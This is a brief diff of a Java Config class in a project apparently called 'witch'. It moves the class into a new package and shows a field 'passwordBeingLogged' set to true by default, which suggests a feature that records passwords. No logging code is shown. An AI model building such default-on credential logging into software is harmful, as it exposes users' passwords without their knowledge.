@@ -1,4 +1,4 @@
-package me.soda.witch.features;
+package me.soda.witch.client.features;
 
 public class Config {
     public boolean passwordBeingLogged = true;
